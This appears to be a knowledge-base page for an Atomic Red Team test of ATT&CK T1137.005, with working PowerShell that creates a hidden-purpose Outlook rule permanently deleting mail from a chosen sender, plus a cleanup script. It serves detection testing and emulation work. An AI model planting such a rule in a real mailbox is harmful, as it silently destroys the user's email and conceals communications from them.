---
atomic_guid: "bddfd8d4-7687-4971-b611-50a537ab3ab4"
title: "Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.005"
attack_technique_name: "Office Application Startup: Outlook Rules"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.005/T1137.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "bddfd8d4-7687-4971-b611-50a537ab3ab4"
  - "Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object

Creates an Outlook rule via COM that permanently deletes emails received
from a specific sender address. Adversaries use sender-based triggers to
make rules appear more legitimate (e.g. disguised as a filter for a
specific colleague). Tests a different rule condition path through the
COM object model. Uses DeletePermanently as it does not require a resolved
Exchange folder unlike MoveToFolder.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

## Metadata

- Atomic GUID: bddfd8d4-7687-4971-b611-50a537ab3ab4
- Technique: T1137.005: Office Application Startup: Outlook Rules
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1137.005/T1137.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.005]]

## Input Arguments

### rule_name

- description: Name for the malicious Outlook rule
- type: string
- default: AtomicTest_T1137005_SenderTrigger

### trigger_sender

- description: Sender email address that triggers the rule
- type: string
- default: atomictest@redteam.local

## Dependencies

Classic Outlook must be installed (required for COM automation)

### Prerequisite Check

```untitled
$clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
if ($clsid) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```untitled
Write-Host "[-] Classic Outlook is not installed or COM is not registered."
Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
exit 1
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$rule      = $rules.Create("#{rule_name}", 0)

$cond = $rule.Conditions.From
$cond.Enabled = $true
$cond.Recipients.Add("#{trigger_sender}")
$cond.Recipients.ResolveAll() | Out-Null

$action         = $rule.Actions.DeletePermanently
$action.Enabled = $true

$rule.Enabled = $true
$rules.Save()
Write-Host "[+] Sender-based rule '#{rule_name}' created. Emails from '#{trigger_sender}' will be permanently deleted."
```

### Cleanup

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
    exit 1
}
$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$removed   = $false
for ($i = $rules.Count; $i -ge 1; $i--) {
    if ($rules.Item($i).Name -eq "#{rule_name}") {
        $rules.Remove($rules.Item($i).Name)
        $removed = $true
    }
}
if ($removed) {
    $rules.Save()
    Write-Host "[+] All instances of rule '#{rule_name}' removed."
} else {
    Write-Host "[*] Rule '#{rule_name}' not found - already removed."
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.005/T1137.005.yaml)
